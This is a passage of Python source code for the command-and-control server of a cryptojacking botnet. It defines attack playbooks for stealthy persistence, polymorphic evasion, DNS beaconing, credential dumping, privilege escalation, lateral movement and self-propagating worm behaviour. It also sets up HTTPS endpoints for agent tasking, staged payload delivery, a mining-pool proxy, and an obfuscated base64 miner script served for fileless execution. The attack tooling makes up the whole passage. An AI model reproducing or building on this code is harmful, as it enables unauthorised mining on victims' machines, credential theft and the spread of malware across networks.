        {'playbook_id': 8, 'name': 'High Camouflage', 'type': 'defensive', 'intensity': 0.0, 'auto_redeploy': True, 'description': 'No mining, pure stealth and persistence. Frequent obfuscation changes.', 'active_hours_start': 0, 'active_hours_end': 24, 'enable_dns_beacon': True, 'base_beacon_interval': 7200, 'beacon_jitter_percent': 0.6}, # Very slow beacon 2h +/-60%
        {'playbook_id': 9, 'name': 'Resource Monitor', 'type': 'defensive', 'intensity': 0.0, 'auto_redeploy': False, 'description': 'Monitor system resources and security events, no mining. Report only.', 'active_hours_start': 0, 'active_hours_end': 24, 'enable_dns_beacon': True, 'base_beacon_interval': 900, 'beacon_jitter_percent': 0.3},
        {'playbook_id': 10, 'name': 'Evasive Maneuvers', 'type': 'defensive', 'intensity': 0.1, 'auto_redeploy': True, 'description': 'Frequent polymorphic redeployment even if miner is running. High evasion.', 'active_hours_start': 0, 'active_hours_end': 24, 'enable_dns_beacon': True, 'base_beacon_interval': 300, 'beacon_jitter_percent': 0.75}, # More frequent, high jitter
        {'playbook_id': 11, 'name': 'Information Gathering', 'type': 'defensive', 'intensity': 0.0, 'auto_redeploy': False, 'description': 'Focus on collecting system information and network data (requires specific tasks from C2).', 'active_hours_start': 0, 'active_hours_end': 24, 'enable_dns_beacon': True, 'base_beacon_interval': 1800, 'beacon_jitter_percent': 0.4},
        {'playbook_id': 12, 'name': 'Full Lockdown', 'type': 'defensive', 'intensity': 0.0, 'auto_redeploy': False, 'description': 'No mining, no active tasks, only basic check-in for persistence. Minimal footprint.', 'active_hours_start': 0, 'active_hours_end': 24, 'enable_dns_beacon': True, 'base_beacon_interval': 14400, 'beacon_jitter_percent': 0.8}, # Very infrequent beacon 4h +/-80%
        
        # New Playbook Types: Recon, Privilege Escalation, Lateral Movement, Worm
        {'playbook_id': 13, 'name': 'Basic Reconnaissance', 'type': 'recon', 'intensity': 0.0, 'auto_redeploy': False, 'description': 'Gathers basic system information, network configuration, and running processes. No active compromise.', 'active_hours_start': 0, 'active_hours_end': 24, 'enable_dns_beacon': False, 'base_beacon_interval': 600, 'beacon_jitter_percent': 0.2}, 
        {'playbook_id': 14, 'name': 'Privilege Escalation Attempt', 'type': 'privesc', 'intensity': 0.0, 'auto_redeploy': True, 'description': 'Attempts common privilege escalation techniques. Requires further C2 action for full exploitation.', 'active_hours_start': 8, 'active_hours_end': 18, 'enable_dns_beacon': False, 'base_beacon_interval': 300, 'beacon_jitter_percent': 0.3},
        {'playbook_id': 15, 'name': 'Internal Network Scan', 'type': 'lateral_movement', 'intensity': 0.0, 'auto_redeploy': False, 'description': 'Performs a light internal network scan to identify potential targets for lateral movement.', 'active_hours_start': 19, 'active_hours_end': 7, 'enable_dns_beacon': False, 'base_beacon_interval': 1200, 'beacon_jitter_percent': 0.1},
        {'playbook_id': 16, 'name': 'Credential Dumping', 'type': 'privesc', 'intensity': 0.0, 'auto_redeploy': False, 'description': 'Attempts to dump credentials from memory or disk.', 'active_hours_start': 0, 'active_hours_end': 24, 'enable_dns_beacon': False, 'base_beacon_interval': 600, 'beacon_jitter_percent': 0.25},
        {'playbook_id': 17, 'name': 'Service Enumeration', 'type': 'recon', 'intensity': 0.0, 'auto_redeploy': False, 'description': 'Enumerates running services and their configurations.', 'active_hours_start': 0, 'active_hours_end': 24, 'enable_dns_beacon': False, 'base_beacon_interval': 900, 'beacon_jitter_percent': 0.1},
        {'playbook_id': 18, 'name': 'SMB Share Discovery', 'type': 'lateral_movement', 'intensity': 0.0, 'auto_redeploy': False, 'description': 'Discovers accessible SMB shares on the local network.', 'active_hours_start': 0, 'active_hours_end': 24, 'enable_dns_beacon': False, 'base_beacon_interval': 1800, 'beacon_jitter_percent': 0.3},
        {'playbook_id': 19, 'name': 'Worm Propagation', 'type': 'worm', 'intensity': 0.0, 'auto_redeploy': True, 'auto_propagate': True, 'description': 'Aggressively attempts to propagate across the network using available methods.', 'active_hours_start': 0, 'active_hours_end': 24, 'enable_dns_beacon': True, 'base_beacon_interval': 120, 'beacon_jitter_percent': 0.5},
    ]
    for pb in playbooks:
        playbooks_collection.update_one({'playbook_id': pb['playbook_id']}, {'$set': pb}, upsert=True)
    log_event('info', f"Initialized {len(playbooks)} playbooks in MongoDB.")

# --- Main Application Setup & Execution ---

async def init_app():
    """Initializes the aiohttp web application and sets up routes for C2 communication."""
    app = web.Application()
    # Store the runner in the app instance for easy access during health checks/restarts
    app['runner'] = None
    
    # HTTP API Endpoints for Agents (Registration, Tasking, Results, Telemetry)
    app.router.add_get(get_c2_path("register", "{agent_id}"), handle_registration)
    app.router.add_get(get_c2_path("task", "{agent_id}"), handle_task_retrieval)
    app.router.add_post(get_c2_path("results", "{agent_id}"), handle_task_result)
    app.router.add_post(get_c2_path("telemetry", "{agent_id}"), handle_telemetry)
    
    # WebSocket Endpoint for Miners (C2 acting as a proxy to the mining pool)
    app.router.add_get(get_c2_path("websocket"), websocket_handler)
    
    # New endpoint for staged payload delivery
    app.router.add_get(get_c2_path("staged_payload", "{agent_id}", "{chunk_id}"), handle_staged_payload_delivery)

    # Simple Health Check Endpoint for component monitoring
    app.router.add_get('/health', health_check_endpoint)
    
    # Static files (e.g., miner.js) - this is where agents will download the JS miner
    # Note: miner.js served here will be base64 encoded for in-memory execution.
    app.router.add_static(os.path.dirname(get_c2_path("miner_js")) + '/', path=STATIC_DIR, name='static')
    
    return app

async def main_server_loop(shutdown_event: asyncio.Event):
    """
    Main asynchronous server loop to run the aiohttp application.
    This function manages the lifecycle of the web server and background tasks.
    """
    # Ensure SSL certificate and key exist; generate if not.
    if not os.path.exists(CERT_FILE) or not os.path.exists(KEY_FILE):
        if not generate_self_signed_cert(CERT_FILE, KEY_FILE, Host):
            os._exit(1) # Exit if certificate generation fails
    
    global CERT_PUBKEY_HASH
    CERT_PUBKEY_HASH = get_cert_pubkey_hash(CERT_FILE)
    if not CERT_PUBKEY_HASH:
        log_event('fatal_error', "Could not compute certificate public key hash. Certificate pinning will be ineffective.", agent_id="N/A")
        # Decide if this is a fatal error or just a warning based on desired strictness
        # For this exercise, we will proceed but log it as a critical issue.

    # Ensure miner.js exists in the static directory; generate initial obfuscated version if missing.
    # The content will be base64 encoded as it will be executed in-memory by agents.
    if not os.path.exists(MINER_JS_PATH):
        try:
            raw_js_content = generate_obfuscated_miner_js()
            with open(MINER_JS_PATH, 'w') as f:
                f.write(base64.b64encode(raw_js_content.encode()).decode()) 
            log_event('info', f"Initial {MINER_JS_PATH} (base64 encoded) generated for fileless execution.")
        except Exception as e:
            log_event('fatal_error', f"Failed to write initial miner.js: {e}. Miner deployment may fail.", agent_id="N/A")
            log_crash(e, traceback.format_exc())

    global app # Make `app` globally accessible for `health_check`
    app = await init_app()
    runner = web.AppRunner(app)
    app['runner'] = runner # Store runner in app for external access (e.g., health_check)
    
    try:
        await runner.setup()
    except Exception as e:
        log_event('fatal_error', f"Failed to setup aiohttp runner: {e}. Server cannot start.", agent_id="N/A")
        log_crash(e, traceback.format_exc())
        os._exit(1) # Critical failure: exit if web server cannot be set up
    
    # Configure SSL context
    ssl_context = None
    try:
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain(CERT_FILE, KEY_FILE)
        log_event('info', "SSL context loaded successfully for HTTPS.")
    except FileNotFoundError:
        log_event('fatal_error', f"SSL certificate or key file not found ({CERT_FILE}, {KEY_FILE}). HTTPS will not be enabled. Server cannot start securely.", agent_id="N/A")
        log_crash(f"Missing SSL files", traceback.format_exc())
        os._exit(1)
    except Exception as e:
        log_event('fatal_error', f"Failed to load SSL context: {e}. HTTPS will not be enabled. Server cannot start securely.", agent_id="N/A")
        log_crash(e, traceback.format_exc())
        os._exit(1)

    # Host and Port are now loaded from ConfLoad.py
    site = web.TCPSite(runner, Host, Port, ssl_context=ssl_context) # Pass SSL context here
    try:
        await site.start()
        log_event('server', f"[*] C2 Server Listening securely on https://{Host}:{Port}...") # Prominent listening message for HTTPS
    except Exception as e:
        log_event('fatal_error', f"Failed to start aiohttp server: {e}. Check if port {Port} is in use or permissions.", agent_id="N/A")
        log_crash(e, traceback.format_exc())
        os._exit(1) # Critical failure: exit if server cannot bind/start

    # Initialize playbooks in MongoDB (ensure they are available for automation)
    initialize_playbooks()

    # Initialize last_bulk_instruction_time and last_initial_setup_time here on server start
    # This sets the cooldowns to start from the server's launch time.
    global last_bulk_instruction_time
    global last_initial_setup_time
    last_bulk_instruction_time = datetime.now(UTC)
    last_initial_setup_time = datetime.now(UTC)

    # Schedule background automation tasks
    asyncio.create_task(schedule_tasks(), name="schedule_tasks_loop")
    asyncio.create_task(health_check(), name="health_check_loop")
    
    # This asyncio.Event keeps the main_server_loop running indefinitely.
    # It will be set from the CLI thread when the server is signaled to shut down.
    try:
        await shutdown_event.wait()
    finally:
        log_event('shutdown', "Server shutdown event received. Cleaning up...")
        # Graceful shutdown: stop all running sites and cleanup runner
        await site.stop()
        await runner.cleanup()
        log_event('shutdown', "Server gracefully shut down.")

if __name__ == '__main__':
    # Initialize the MongoDB collections (ensure they exist with correct schema/indexes if needed)
    # This might be more robust as part of a separate setup script or within the initialize_playbooks function.
    # For now, relying on PyMongo's auto-creation on first insert.

    # Event to signal shutdown from CLI thread to main async loop
    shutdown_event = asyncio.Event()

    # Get the current event loop for the main thread
    main_loop = asyncio.get_event_loop()

    # Start the CLI in a separate thread. This is crucial because `input()` is blocking.
    # We pass the main event loop and the shutdown_event to allow the CLI thread
    # to schedule coroutines on the main loop and signal shutdown.
    cli_thread = threading.Thread(target=start_cli_thread, args=(main_loop, shutdown_event), daemon=True)
    cli_thread.start()

    # Run the main asynchronous server loop
    try:
        main_loop.run_until_complete(main_server_loop(shutdown_event))
    except KeyboardInterrupt:
        log_event('shutdown', "\nKeyboardInterrupt detected. Initiating graceful shutdown...")
        # Ensure global_shutdown_event is correctly referencing the local shutdown_event
        # if this block is executed (e.g., if there's no `global global_shutdown_event` and it's a new Event)
        shutdown_event.set() # Signal the main_server_loop to exit its wait()
        # Give a moment for the main_server_loop to process cancellation and cleanup
        time.sleep(1)
    except Exception as e:
        log_event('fatal_error', f"Fatal server error: {e}. Exiting.")
        log_crash(e, traceback.format_exc())
        os._exit(1) # Force exit on unhandled critical errors
    finally:
        # Final cleanup: ensure all remaining tasks are cancelled and loop is closed.
        for task in asyncio.all_tasks(main_loop):
            if not task.done():
                task.cancel()
        # This line assumes 'loop' is accessible. If not, it should be 'main_loop'.
        # Also, shutdown_asyncgens() might not be strictly necessary depending on aiohttp version.
        try:
            main_loop.run_until_complete(main_loop.shutdown_asyncgens()) # Shut down async generators
        except Exception as e:
            log_event('error', f"Error during async generator shutdown: {e}")
            log_crash(e, traceback.format_exc())
        
        main_loop.close()
        print("Server process terminated.")